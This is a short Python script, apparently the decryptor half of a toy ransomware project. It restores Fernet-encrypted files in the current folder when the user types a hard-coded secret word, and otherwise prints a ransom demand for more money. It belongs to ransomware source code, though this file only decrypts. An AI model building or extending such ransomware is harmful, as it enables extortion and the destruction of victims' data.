import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "villain.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretword = "peaches"

user_word = input("Enter the secret word to decrypt your files: ")

if user_word == secretword:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)

        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
    print("Congratulations!! Your files are decrypted")

else:
    print("Sorry, wrong word, send me 500,000 more dollars!!")
